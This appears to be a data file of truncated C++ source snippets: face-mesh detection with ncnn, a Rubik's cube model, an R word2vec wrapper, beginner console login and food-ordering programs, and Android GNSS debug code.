endl;\n                return 0;\n            default:\n                cout << \"SORRY Invalid option.\" << endl;\n                cout << \"Please select a valid option (1 & 2 & 3).\\n\";\n        }\n    }\n    return 0;\n}\n\n",
    "// Tencent is pleased to support the open source community by making ncnn available.\n//\n// Copyright (C) 2021 THL A29 Limited, a Tencent company. All rights reserved.\n//\n// Licensed under the BSD 3-Clause License (the \"License\"); you may not use this file except\n// in compliance with the License. You may obtain a copy of the License at\n//\n// https://opensource.org/licenses/BSD-3-Clause\n//\n// Unless required by applicable law or agreed to in writing, software distributed\n// under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR\n// CONDITIONS OF ANY KIND, either express or implied. See the License for the\n// specific language governing permissions and limitations under the License.\n\n#include \"face_mesh.h\"\n\n#include <opencv2/core/core.hpp>\n#include <opencv2/imgproc/imgproc.hpp>\n#include \"cpu.h\"\n#include \"fash_mesh_data.h\"\n\n#include <map>\n\nstatic inline float intersection_area(const FaceObject &a, const FaceObject &b) {\n    cv::Rect_<float> inter = a.rect & b.rect;\n    return inter.area();\n}\n\nstatic void qsort_descent_inplace(std::vector<FaceObject> &faceobjects, int left, int right) {\n    int i = left;\n    int j = right;\n    float p = faceobjects[(left + right) / 2].score;\n\n    while (i <= j) {\n        while (faceobjects[i].score > p)\n            i++;\n\n        while (faceobjects[j].score < p)\n            j--;\n\n        if (i <= j) {\n            // swap\n            std::swap(faceobjects[i], faceobjects[j]);\n\n            i++;\n            j--;\n        }\n    }\n\n#pragma omp parallel sections\n    {\n#pragma omp section\n        {\n            if (left < j) qsort_descent_inplace(faceobjects, left, j);\n        }\n#pragma omp section\n        {\n            if (i < right) qsort_descent_inplace(faceobjects, i, right);\n        }\n    }\n}\n\nstatic void qsort_descent_inplace(std::vector<FaceObject> &faceobjects) {\n    if (faceobjects.empty())\n        return;\n\n    qsort_descent_inplace(faceobjects, 0, faceobjects.size() - 1);\n}\n\nstatic void nms_sorted_bboxes(const std::vector<FaceObject> &faceobjects, std::vector<int> &picked, float nms_threshold) {\n    picked.clear();\n\n    const int n = faceobjects.size();\n\n    std::vector<float> areas(n);\n    for (int i = 0; i < n; i++) {\n        areas[i] = faceobjects[i].rect.area();\n    }\n\n    for (int i = 0; i < n; i++) {\n        const FaceObject &a = faceobjects[i];\n\n        int keep = 1;\n        for (int j = 0; j < (int) picked.size(); j++) {\n            const FaceObject &b = faceobjects[picked[j]];\n\n            // intersection over union\n            float inter_area = intersection_area(a, b);\n            float union_area = areas[i] + areas[picked[j]] - inter_area;\n            // float IoU = inter_area / union_area\n            if (inter_area / union_area > nms_threshold)\n                keep = 0;\n        }\n\n        if (keep)\n            picked.push_back(i);\n    }\n}\n\nstatic inline float sigmoid(float x) {\n    return static_cast<float>(1.f / (1.f + exp(-x)));\n}\n\nstatic void\ngenerate_proposals(const ncnn::Mat &anchors, int stride, const ncnn::Mat &in_pad, const ncnn::Mat &feat_blob,\n                   float prob_threshold, std::vector<FaceObject> &objects) {\n    const int num_grid = feat_blob.h;\n\n    int num_grid_x;\n    int num_grid_y;\n    if (in_pad.w > in_pad.h) {\n        num_grid_x = in_pad.w / stride;\n        num_grid_y = num_grid / num_grid_x;\n    } else {\n        num_grid_y = in_pad.h / stride;\n        num_grid_x = num_grid / num_grid_y;\n    }\n\n    const int num_class = feat_blob.w - 15;\n\n    const int num_anchors = anchors.w / 2;\n\n    for (int q = 0; q < num_anchors; q++) {\n        const float anchor_w = anchors[q * 2];\n        const float anchor_h = anchors[q * 2 + 1];\n\n        const ncnn::Mat feat = feat_blob.channel(q);\n\n        for (int i = 0; i < num_grid_y; i++) {\n            for (int j = 0; j < num_grid_x; j++) {\n                const float *featptr = feat.row(i * num_grid_x + j);\n\n                // find class index with max class score\n                int class_index = 0;\n                float class_score = -FLT_MAX;\n                for (int k = 0; k < num_class; k++) {\n                    float score = featptr[15 + k];\n                    if (score > class_score) {\n                        class_index = k;\n                        class_score = score;\n                    }\n                }\n\n                float box_score = featptr[4];\n\n                float confidence = sigmoid(box_score);// *sigmoid(class_score);\n\n                if (confidence >= prob_threshold) {\n                    float dx = sigmoid(featptr[0]);\n                    float dy = sigmoid(featptr[1]);\n                    float dw = sigmoid(featptr[2]);\n                    float dh = sigmoid(featptr[3]);\n\n                    float pb_cx = (dx * 2.f - 0.5f + j) * stride;\n                    float pb_cy = (dy * 2.f - 0.5f + i) * stride;\n\n                    float pb_w = pow(dw * 2.f, 2) * anchor_w;\n                    float pb_h = pow(dh * 2.f, 2) * anchor_h;\n\n                    float x0 = pb_",
    "//\n// Created by Keya on 03-08-2024.\n//\n#include \"RubiksCube.h\"\n\nclass RubiksCube1dArray : public RubiksCube {\nprivate:\n\n    /*\n     * Given a face index, row and col, return it's flattened index\n     */\n    static inline int getIndex(int ind, int row, int col) {\n        return (ind * 9) + (row * 3) + col;\n    }\n\n    void rotateFace(int ind) {\n        char temp_arr[9] = {};\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                temp_arr[i * 3 + j] = cube[getIndex(ind, i, j)];\n            }\n        }\n        for (int i = 0; i < 3; i++) cube[getIndex(ind, 0, i)] = temp_arr[getIndex(0, 2 - i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(ind, i, 2)] = temp_arr[getIndex(0, 0, i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(ind, 2, 2 - i)] = temp_arr[getIndex(0, i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(ind, 2 - i, 0)] = temp_arr[getIndex(0, 2, 2 - i)];\n    }\n\npublic:\n    char cube[54]{};\n\n    RubiksCube1dArray() {\n        for (int i = 0; i < 6; i++) {\n            for (int j = 0; j < 3; j++) {\n                for (int k = 0; k < 3; k++) {\n                    cube[i * 9 + j * 3 + k] = getColorLetter(COLOR(i));\n                }\n            }\n        }\n    }\n\n    COLOR getColor(FACE face, unsigned row, unsigned col) const override {\n        char color = cube[getIndex((int)face, (int)row, (int)col)];\n        switch (color) {\n            case 'B':\n                return COLOR::BLUE;\n            case 'R':\n                return COLOR::RED;\n            case 'G':\n                return COLOR::GREEN;\n            case 'O':\n                return COLOR::ORANGE;\n            case 'Y':\n                return COLOR::YELLOW;\n            default:\n                return COLOR::WHITE;\n        }\n    }\n\n    bool isSolved() const override {\n        for (int i = 0; i < 6; i++) {\n            for (int j = 0; j < 3; j++) {\n                for (int k = 0; k < 3; k++) {\n                    if (this->cube[getIndex(i, j, k)] == getColorLetter(COLOR(i))) continue;\n                    return false;\n                }\n            }\n        }\n        return true;\n    }\n\n    RubiksCube &u() override {\n        this->rotateFace(0);\n\n        char temp_arr[3] = {};\n        for (int i = 0; i < 3; i++) temp_arr[i] = cube[getIndex(4, 0, 2 - i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(4, 0, 2 - i)] = cube[getIndex(1, 0, 2 - i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(1, 0, 2 - i)] = cube[getIndex(2, 0, 2 - i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(2, 0, 2 - i)] = cube[getIndex(3, 0, 2 - i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(3, 0, 2 - i)] = temp_arr[i];\n\n        return *this;\n    }\n\n    RubiksCube &uPrime() override {\n        this->u();\n        this->u();\n        this->u();\n\n        return *this;\n    }\n\n    RubiksCube &u2() override {\n        this->u();\n        this->u();\n\n        return *this;\n    }\n\n    RubiksCube &l() override {\n        this->rotateFace(1);\n\n        char temp_arr[3] = {};\n        for (int i = 0; i < 3; i++) temp_arr[i] = cube[getIndex(0, i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(0, i, 0)] = cube[getIndex(4, 2 - i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(4, 2 - i, 2)] = cube[getIndex(5, i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(5, i, 0)] = cube[getIndex(2, i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(2, i, 0)] = temp_arr[i];\n\n        return *this;\n    }\n\n    RubiksCube &lPrime() override {\n        this->l();\n        this->l();\n        this->l();\n\n        return *this;\n    }\n\n    RubiksCube &l2() override {\n        this->l();\n        this->l();\n\n        return *this;\n    }\n\n    RubiksCube &f() override {\n        this->rotateFace(2);\n\n        char temp_arr[3] = {};\n        for (int i = 0; i < 3; i++) temp_arr[i] = cube[getIndex(0, 2, i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(0, 2, i)] = cube[getIndex(1, 2 - i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(1, 2 - i, 2)] = cube[getIndex(5, 0, 2 - i)];\n        for (int i = 0; i < 3; i++) cube[getIndex(5, 0, 2 - i)] = cube[getIndex(3, i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(3, i, 0)] = temp_arr[i];\n\n        return *this;\n    }\n\n    RubiksCube &fPrime() override {\n        this->f();\n        this->f();\n        this->f();\n\n        return *this;\n    }\n\n    RubiksCube &f2() override {\n        this->f();\n        this->f();\n\n        return *this;\n    }\n\n    RubiksCube &r() override {\n        this->rotateFace(3);\n\n        char temp_arr[3] = {};\n        for (int i = 0; i < 3; i++) temp_arr[i] = cube[getIndex(0, 2 - i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(0, 2 - i, 2)] = cube[getIndex(2, 2 - i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(2, 2 - i, 2)] = cube[getIndex(5, 2 - i, 2)];\n        for (int i = 0; i < 3; i++) cube[getIndex(5, 2 - i, 2)] = cube[getIndex(4, i, 0)];\n        for (int i = 0; i < 3; i++) cube[getIndex(4, i, 0)] = temp_arr[i];\n\n       ",
    "#include <Rcpp.h>\n#include <progress.hpp>\n#include <progress_bar.hpp>\n\n#include <iostream>\n#include <iomanip>\n#include \"word2vec.hpp\"\n#include <unordered_map>\n\n// [[Rcpp::depends(RcppProgress)]]\n// [[Rcpp::export]]\nRcpp::List w2v_train(Rcpp::List texts_, \n                     Rcpp::CharacterVector types_, \n                     std::string modelFile = \"\", \n                     uint16_t minWordFreq = 5, // TODO: remove\n                     uint16_t size = 100,\n                     uint8_t window = 5,\n                     uint16_t expTableSize = 1000,\n                     uint8_t expValueMax = 6,\n                     float sample = 0.001,\n                     bool withHS = false,\n                     uint8_t negative = 5,\n                     uint8_t threads = 1,\n                     uint8_t iterations = 5,\n                     float alpha = 0.05,\n                     bool withSG = false,\n                     bool verbose = false,\n                     bool normalize = true) {\n  \n  \n  /*\n   uint16_t minWordFreq = 5; ///< discard words that appear less than minWordFreq times\n   uint16_t size = 100; ///< word vector size\n   uint8_t window = 5; ///< skip length between words\n   uint16_t expTableSize = 1000; ///< exp(x) / (exp(x) + 1) values lookup table size\n   uint8_t expValueMax = 6; ///< max value in the lookup table\n   float sample = 1e-3f; ///< threshold for occurrence of words\n   bool withHS = false; ///< use hierarchical softmax instead of negative sampling\n   uint8_t negative = 5; ///< negative examples number\n   uint8_t threads = 12; ///< train threads number\n   uint8_t iterations = 5; ///< train iterations\n   float alpha = 0.05f; ///< starting learn rate\n   bool withSG = false; ///< use Skip-Gram instead of CBOW\n   std::string wordDelimiterChars = \" \\n,.-!?:;/\\\"#$%&'()*+<=>@[]\\\\^_`{|}~\\t\\v\\f\\r\";\n   std::string endOfSentenceChars = \".\\n?!\";\n   */\n  \n  texts_t texts = Rcpp::as<texts_t>(texts_);\n  types_t types = Rcpp::as<types_t>(types_);\n  \n  w2v::corpus_t corpus(texts, types);\n  corpus.setWordFreq();\n      \n  // Rcpp::List out2 = Rcpp::List::create(\n  //     Rcpp::Named(\"frequency\") = corpus.frequency\n  // );\n  // \n  // return out2;\n  \n  w2v::trainSettings_t trainSettings;\n  trainSettings.minWordFreq = minWordFreq; // TODO: remove\n  trainSettings.size = size;\n  trainSettings.window = window;\n  trainSettings.expTableSize = expTableSize;\n  trainSettings.expValueMax = expValueMax;\n  trainSettings.sample = sample;\n  trainSettings.withHS = withHS;\n  trainSettings.negative = negative;\n  trainSettings.threads = threads;\n  trainSettings.iterations = iterations;\n  trainSettings.alpha = alpha;\n  trainSettings.withSG = withSG;\n  trainSettings.random = (uint32_t)(Rcpp::runif(1)[0] * std::numeric_limits<uint32_t>::max());\n  //trainSettings.wordDelimiterChars = wordDelimiterChars;\n  //trainSettings.endOfSentenceChars = endOfSentenceChars;\n  Rcpp::XPtr<w2v::w2vModel_t> model(new w2v::w2vModel_t(), true);\n  bool trained;\n  \n  std::size_t trainWords;\n  std::size_t totalWords;\n  if (verbose) { // NOTE: consider removing progress bar\n    Progress p(100, true);\n    trained = model->train(trainSettings, corpus, \n                           [&p] (float _alpha, float _percent) {\n                             /*\n                              std::cout << '\\r'\n                                        << \"alpha: \"\n                                        << std::fixed << std::setprecision(6)\n                                        << _alpha\n                                        << \", progress: \"\n                                        << std::fixed << std::setprecision(2)\n                                        << _percent << \"%\"\n                                        << std::flush;\n                              */\n                             p.update(_percent);\n                           }\n    );\n  } else {\n    trained = model->train(trainSettings, corpus, nullptr);\n  }\n  Rcpp::Rcout << \"Training done\\n\";\n  //return Rcpp::List::create();\n  bool success = true;\n  if (!trained) {\n    Rcpp::Rcout << \"Training failed: \" << model->errMsg() << std::endl;\n    success = false;\n  }\n  // NORMALISE UPFRONT - DIFFERENT THAN ORIGINAL CODE \n  // - original code dumps data to disk, next imports it and during import normalisation happens after which we can do nearest calculations\n  // - the R wrapper only writes to disk at request so we need to normalise upfront in order to do directly nearest calculations\n  if (normalize) {\n    //Rcpp::Rcout << \"Finished training: finalising with embedding normalisation\" << std::endl;\n    model->normalize();\n  }\n  \n  // Return model + model information\n  Rcpp::List out = Rcpp::List::create(\n    Rcpp::Named(\"model\") = model,\n    Rcpp::Named(\"data\") = Rcpp::List::create(\n      //Rcpp::Named(\"file\") = trainFile,\n      //Rcpp::Named(\"stopwords\") = stopWordsFile,\n      Rcpp::Named(\"n\") = totalWords,\n      Rcpp::Named(\"n_vocabulary\") = trainWords\n    ),\n    Rcpp::Named(\"vocabulary\") = types.size(),\n    Rcpp::Named(\"",
    "#include <bits/stdc++.h> \r\nusing namespace std;\r\nvoid NewRegister();\r\nbool validEmail(string);\r\nbool validfirstname(string);\r\nbool validlastname(string);\r\nbool validPassword(string);\r\nvoid verificationcode();\r\nvoid Login();\r\nint main()\r\n{\r\n    cout<<\"THIS IS A LOGIN/REGISTER PAGE\"<<endl;\r\n    cout<< \"Welcome!\" << endl;\r\n    cout<< \"Let's begin the PROCESS..\" << endl\r\n         << endl;\r\n\r\n    NewRegister();\r\n\r\n    return 0;\r\n}\r\nvoid NewRegister() \r\n{\r\n\r\n    string NewRegister, Username, Password, firstname, lastname, email;\r\n\r\n    cout << \"New register?  \\n(Note: if you are a  NEW user type 'Yes', otherwise type 'No') \\n\";\r\n    \r\n    cin >> NewRegister; \r\n    cin.ignore();\r\n\r\n    if (NewRegister == \"Yes\" || NewRegister == \"yes\" )\r\n    {\r\n        cout << \"First name : \"; \r\n        cin >> firstname;\r\n        while (validfirstname(firstname) == false)\r\n        {\r\n            cout << \"The first name is not valid please try again : \" << endl;\r\n            cin >> firstname;\r\n        }\r\n        cout << endl\r\n             << \"Valid first name.\" << endl\r\n             << endl;\r\n\r\n\r\n        cout << \"Last name : \"; \r\n        cin >>lastname ;\r\n        while (validlastname(lastname) == false)\r\n        {\r\n            cout << \"The last name is not valid please try again : \" << endl;\r\n            cin >> lastname;\r\n        }\r\n        cout << endl\r\n             << \"Valid last name.\" << endl\r\n             << endl;\r\n\r\n        cout << \"Email : \"; \r\n        cin >> email;\r\n        while (validEmail(email) == false)\r\n        {\r\n            cout << \"The email address is not valid please try again : \" << endl;\r\n            cin >> email;\r\n        }\r\n        cout << endl\r\n             << \"Valid email address.\" << endl\r\n             << endl;\r\n\r\n        cout << \"Password : \\n(Note: your password must be at least one digit,one special character, one uppercase letter, and one lowercase letter) \\n\"; // enter password\r\n        cin >> Password;\r\n        while (validPassword(Password) == false)\r\n        {\r\n            cout << \"The password is not valid please try again : \" << endl;\r\n            cin >> Password;\r\n        }\r\n        cout << endl\r\n             << \"Valid password.\" << endl\r\n             << endl;\r\n\r\n        cout << \"Registration completed! \\n\" << endl;\r\n        verificationcode();\r\n    }\r\n    else if (NewRegister == \"No\"  ||NewRegister == \"no\") \r\n    {\r\n\t\tstring Username, Password;\r\n    cout << endl    << \"     Log in       \" << endl<< endl;\r\n    cout << \"Enter your username :\" << endl;\r\n    getline(cin, Username);\r\n\r\n    cout << \"Enter your password :\" << endl;\r\n    cin >> Password;\r\n\r\n    cout << endl\r\n         << \"Login success!\" << endl;\r\n    }\r\n}\r\nbool validfirstname(string firstname) \r\n{\r\n    if (firstname[0] >= 'A' && firstname[0] <= 'Z')\r\n      return true;\r\n\t  else\r\n\t  return false;\r\n}\r\nbool validlastname(string lastname) \r\n{\r\n    if (lastname[0] >= 'A' && lastname[0] <= 'Z')\r\n      return true;\r\n    \r\n    else \r\n  \t return false;\r\n       \r\n    \r\n}\r\nbool validEmail(string email) \r\n{\r\n    int AT = -1, dot = -1;                                                            \r\n    int counterforAT = 0, counterforDot = 0;                                          \r\n    if ((email[0] >= 'a' && email[0] <= 'z') || (email[0] >= 'A' && email[0] <= 'Z')) \r\n    {\r\n        for (int i = 0; i < email.length(); i++)\r\n        {\r\n            if (email[i] == '@') \r\n            {\r\n                AT = i;\r\n                ++counterforAT;\r\n            }\r\n\r\n            else if (email[i] == '.') \r\n            {\r\n                dot = i;\r\n                ++counterforDot;\r\n            }\r\n        }\r\n        if (AT == -1 || dot == -1) \r\n\r\n            return false;\r\n\r\n        if (AT > dot) \r\n\r\n            return false;\r\n\r\n        if (counterforDot > 1 || counterforAT > 1)\r\n            return false;\r\n\r\n        return !(dot >= (email.length() - 1));\r\n    }\r\n    else if (email[0] >= '0' && email[0] <= '9') \r\n    {\r\n        return false;\r\n    }\r\n    else \r\n    {\r\n        return false;\r\n    }\r\n}\r\nbool validPassword(string password) \r\n{\r\n    int digit = 0, uppercase = 0, lowercase = 0, specialChar = 0; \r\n    if (password.length() >= 8 && password.length() <= 15)\r\n    {\r\n\r\n        if (password.find(\" \") == -1)\r\n        {\r\n            for (int i = 0; i < password.length(); i++)\r\n            {\r\n                if (password[i] >= '0' && password[i] <= '9')\r\n                {\r\n                    ++digit;\r\n                }\r\n                else if (password[i] >= 'a' && password[i] <= 'z')\r\n                {\r\n                    ++lowercase;\r\n                }\r\n                else if (password[i] >= 'A' && password[i] <= 'Z')\r\n                {\r\n                    ++uppercase;\r\n                }\r\n                else if (password[i] == '@' || password[i] == '#' || password[i] == '_')\r\n                {\r\n                    ++specialChar;\r\n                }\r\n            }\r\n\r\n            if (digit == 0 || uppercase == 0 || lowercase == 0 || specialChar == 0)\r\n     ",
    "#include<iostream>\n#include<fstream>\n#include<cstring>\nusing namespace std;\nint burger(int*, int*, int*);\nint fries(int*, int*, int*);\nint wings(int*);\nint nuggets(int*);\nint chowmein(int*);\nint soup(int*, int*, int*);\nint pizza(int*, int*, int*);\nint cold(int*, int*, int*);\nvoid option_checker(int*);\nbool endsWithGmail(const char* input)   //to check that the user had enter @gmail.com or not \n{\n\n\tint length = 0;\n\twhile (input[length] != '\\0')\n\t{\n\t\tlength++;\n\t}\n\n\n\tconst char* gmailSuffix = \"@gmail.com\";\n\tint suffixLength = 0;\n\twhile (gmailSuffix[suffixLength] != '\\0') {\n\t\tsuffixLength++;\n\t}\n\n\n\tif (length < suffixLength) {\n\t\treturn false;\n\t}\n\n\n\tfor (int i = 0; i < suffixLength; i++) {\n\t\tif (input[length - suffixLength + i] != gmailSuffix[i]) {\n\t\t\treturn false;\n\t\t}\n\t}\n\n\n\treturn true;\n}\n\nvoid login(ifstream& obj) //FUNCTION THAT WILL READ THE USER'S LOGIN DATA GMAIL AND PASSWORD\n{\n\tint count = 0, fb = 0;\n\tint count2 = 0;\n\tchar* sig = new char[100];\n\tchar line[100];\n\tbool gmail = false;\n\tbool pass = false;\n\tchar* pas = new char[50];\n\tchar lee[50];\n\tchar com[11] = \"@gmail.com\";\n\tobj.open(\"login.txt\");\n\tif (!obj)                       //CHECK IF FILE IS OPEN OR NOT \n\t{\n\t\tcout << \"FILE NOT OPEN\" << endl;\n\t\treturn;\n\t}\n\tcin.ignore();\n\tcout << \"ENTER YOUR GMAIL: \";\n\tcin.getline(sig, 100);        //USERS EXISTING GMAIL THAT IS SAVED IN OUR FILE\n\twhile (!obj.eof())            //READING THE FILE USING EOF\n\t{\n\t\tcount++;\n\t\tobj.getline(line, sizeof(line));\n\t\tif (strcmp(line, sig) == 0 && count % 2 != 0)\n\t\t{\n\t\t\tgmail = true;\n\t\t\tcout << \"Gmail found.\" << endl; //DELETE IT LATER\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (!gmail)\n\t{\n\t\tcout << \"Incorrect Gmail.\" << endl;\n\t}\n\n\twhile (gmail)\n\t{\n\t\tcout << \"Enter your Password: \";\n\t\tcin.getline(pas, 50);\n\t\tobj.clear();\n\t\tobj.seekg(0, ios::beg);\n\t\twhile (!obj.eof())\n\t\t{\n\t\t\tcount2++;\n\t\t\tobj.getline(lee, 50);\n\n\t\t\tif (strcmp(lee, pas) == 0 && count2 == count + 1)\n\t\t\t{\n\t\t\t\tpass = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcout << \"count2 =\" << count2 << endl;\n\t\tif (!pass)\n\t\t{\n\t\t\tcount2 = 0;\n\t\t\tcout << \"Incorrect Password Enter again.\" << endl;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"Login successful.\" << endl;\n\t\t\tbreak;\n\t\t}\n\t}\n\tdelete[] sig;\n\tdelete[] pas;\n\tobj.close();\n}\n\nvoid signup(ofstream& file)    // Function to create a file and save data in it\n{\n\tchar* ar = new char[100];  // Array for Gmail\n\tchar arr[50]; // Array for Password\n\tfile.open(\"login.txt\", ios::app); // Opening the file in append mode\n\tif (!file) // Check if the file is open or not\n\t{\n\t\tcout << \"FILE NOT CREATED\" << endl;\n\t\treturn;\n\t}\n\tcin.ignore();\n\tcout << \"ENTER YOUR GMAIL: \";\n\tcin.getline(ar, 100);\n\tbool a = endsWithGmail(ar);// Enter Gmail\n\tif (a != true)\n\t{\n\t\twhile (a != true)    //to check the user has entered a gmail id or not\n\t\t{\n\t\t\tcout << \"Enter correct gmail: \";\n\t\t\tcin.getline(ar, 100);\n\t\t\ta = endsWithGmail(ar);\n\t\t}\n\t}\n\tifstream check(\"login.txt\");  //Reading the login file \n\tif (!check)\n\t{\n\t\tcout << \"File not open\" << endl;\n\t\treturn;\n\t}\n\tchar line[100];\n\tbool mail = false;\n\twhile (check.getline(line, sizeof(line)))\n\t{\n\t\tif (strcmp(line, ar) == 0)   //checking that the gmail enterred by the user already exists or not \n\t\t{\n\t\t\tmail = true;\n\t\t\tcout << \"Gmail already exists\" << endl;\n\t\t\tcout << \"Enter a new gmail\" << endl;\n\t\t\tcin.getline(ar, 100);\n\t\t}\n\t}\n\tcheck.close();  //closing the file for reading\n\tcout << \"ENTER YOUR PASSWORD: \";\n\tcin.getline(arr, 50); // Enter Password\n\tfile << ar << endl; // Write Gmail to file\n\tfile << arr << endl; // Write Password to file\n\tfile.close(); //closing the file for writing\n\tdelete[] ar;\n}\n\nint main()\n{\n\tchar select;\n\tcout << \"                                                   WELCOME TO Our Food Resturent                                                   \"  << endl;\n\tcout << \"PLEASE SELECT FROM THE GIVEN OPTION\" << endl;\n\tcout << \"1-LOGIN\\n2-SIGN UP\" << endl;\n\tcin >> select;\n\twhile (select != '1' && select != '2') //FOR LOGIN AND SIGNUP\n\t{\n\t\tcout << \"PLEASE ENTER THE CORRECT OPTION\" << endl;\n\t\tcin >> select;\n\t}\n\tif (select == '1') //IF LOGIN \n\t{\n\t\tifstream obj;\n\t\tlogin(obj);\n\t}\n\telse if (select == '2') //IF SIGNUP\n\t{\n\t\tofstream file;\n\t\tsignup(file);\n\t}\n\tofstream fout(\"items.txt\", ios::app);\n\n\tint* op = new int;\n\tint* b1 = new int; // burger\n\tint* b2 = new int; // burger\n\tint* r = new int;\n\tint* f = new int; // friese\n\tint* f1 = new int; // cheese fries\n\tint* f2 = new int; // barbecue fries\n\tint* w = new int; //hot wings\n\tint* n = new int; // nuggets\n\tint* ch = new int; // chowmein\n\tint* s = new int; // soup\n\tint* s1 = new int; // corn soup;\n\tint* s2 = new int; // tomato soup\n\tint* p = new int; // pizza\n\tint* p1 = new int; // Chicken fajita\n\tint* p2 = new int; // Chicken Tikka\n\tint* drink = new int; // cold drink\n\tint* drink1 = new int; // cock\n\tint* drink2 = new int; // dew\n\n\n\n\tint b_sum = 0, f_sum = 0, w_sum = 0, n_sum = 0, c_sum = 0, s_sum = 0, p_sum = 0, d_sum = 0, count = 0;\n\n\n\tchar* o = new char;\n\tint* c = new int;\n\tint* d = new int;\n\tint* total = new int;\n\tint array[8];\n\tint flag = 0;\n\n\t*c = 0;\n\t*d = 0;\n\t*total = ",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"LocSvc_GnssDebugInterface\"\n\n#include <log/log.h>\n#include <log_util.h>\n#include \"Gnss.h\"\n#include \"GnssDebug.h\"\n#include \"LocationUtil.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V1_0 {\nnamespace implementation {\n\nusing ::android::hardware::hidl_vec;\n\n#define GNSS_DEBUG_UNKNOWN_HORIZONTAL_ACCURACY_METERS (20000000)\n#define GNSS_DEBUG_UNKNOWN_VERTICAL_ACCURACY_METERS   (20000)\n#define GNSS_DEBUG_UNKNOWN_SPEED_ACCURACY_PER_SEC     (500)\n#define GNSS_DEBUG_UNKNOWN_BEARING_ACCURACY_DEG       (180)\n\n#define GNSS_DEBUG_UNKNOWN_UTC_TIME            (1483228800000LL) // 1/1/2017 00:00 GMT\n#define GNSS_DEBUG_UNKNOWN_UTC_TIME_UNC        (1.57783680E17) // 5 years in ns\n#define GNSS_DEBUG_UNKNOWN_FREQ_UNC_NS_PER_SEC (2.0e5)  // ppm\n\nGnssDebug::GnssDebug(Gnss* gnss) : mGnss(gnss)\n{\n}\n\n/*\n * This methods requests position, time and satellite ephemeris debug information\n * from the HAL.\n *\n * @return void\n*/\nReturn<void> GnssDebug::getDebugData(getDebugData_cb _hidl_cb)\n{\n    LOC_LOGD(\"%s]: \", __func__);\n\n    DebugData data = { };\n\n    if((nullptr == mGnss) || (nullptr == mGnss->getGnssInterface())){\n        LOC_LOGE(\"GnssDebug - Null GNSS interface\");\n        _hidl_cb(data);\n        return Void();\n    }\n\n    // get debug report snapshot via hal interface\n    GnssDebugReport reports = { };\n    mGnss->getGnssInterface()->getDebugReport(reports);\n\n    // location block\n    if (reports.mLocation.mValid) {\n        data.position.valid = true;\n        data.position.latitudeDegrees = reports.mLocation.mLocation.latitude;\n        data.position.longitudeDegrees = reports.mLocation.mLocation.longitude;\n        data.position.altitudeMeters = reports.mLocation.mLocation.altitude;\n\n        data.position.speedMetersPerSec =\n            (double)(reports.mLocation.mLocation.speed);\n        data.position.bearingDegrees =\n            (double)(reports.mLocation.mLocation.bearing);\n        data.position.horizontalAccuracyMeters =\n            (double)(reports.mLocation.mLocation.accuracy);\n        data.position.verticalAccuracyMeters =\n            reports.mLocation.verticalAccuracyMeters;\n        data.position.speedAccuracyMetersPerSecond =\n            reports.mLocation.speedAccuracyMetersPerSecond;\n        data.position.bearingAccuracyDegrees =\n            reports.mLocation.bearingAccuracyDegrees;\n\n        timeval tv_now, tv_report;\n        tv_report.tv_sec  = reports.mLocation.mUtcReported.tv_sec;\n        tv_report.tv_usec = reports.mLocation.mUtcReported.tv_nsec / 1000ULL;\n        gettimeofday(&tv_now, NULL);\n        data.position.ageSeconds =\n            (tv_now.tv_sec - tv_report.tv_sec) +\n            (float)((tv_now.tv_usec - tv_report.tv_usec)) / 1000000;\n    }\n    else {\n        data.position.valid = false;\n    }\n\n    if (data.position.horizontalAccuracyMeters <= 0 ||\n        data.position.horizontalAccuracyMeters > GNSS_DEBUG_UNKNOWN_HORIZONTAL_ACCURACY_METERS) {\n        data.position.horizontalAccuracyMeters = GNSS_DEBUG_UNKNOWN_HORIZONTAL_ACCURACY_METERS;\n    }\n    if (data.position.verticalAccuracyMeters <= 0 ||\n        data.position.verticalAccuracyMeters > GNSS_DEBUG_UNKNOWN_VERTICAL_ACCURACY_METERS) {\n        data.position.verticalAccuracyMeters = GNSS_DEBUG_UNKNOWN_VERTICAL_ACCURACY_METERS;\n    }\n    if (data.position.speedAccuracyMetersPerSecond <= 0 ||\n        data.position.speedAccuracyMetersPerSecond > GNSS_DEBUG_UNKNOWN_SPEED_ACCURACY_PER_SEC) {\n        data.position.speedAccuracyMetersPerSecond = GNSS_DEBUG_UNKNOWN_SPEED_ACCURACY_PER_SEC;\n    }\n    if (data.position.bearingAccuracyDegrees <= 0 ||\n        data.position.bearingAccuracyDegrees > GNSS_DEBUG_UNKNOWN_BEARING_ACCURACY_DEG) {\n        data.position.bearingAccuracyDegrees = GNSS_DEBUG_UNKNOWN_BEARING_ACCURACY_DEG;\n    }\n\n    // time block\n    if (reports.mTime.mValid) {\n        data.time.timeEstimate = reports.mTime.timeEstimate;\n        data.time.timeUncertaintyNs = 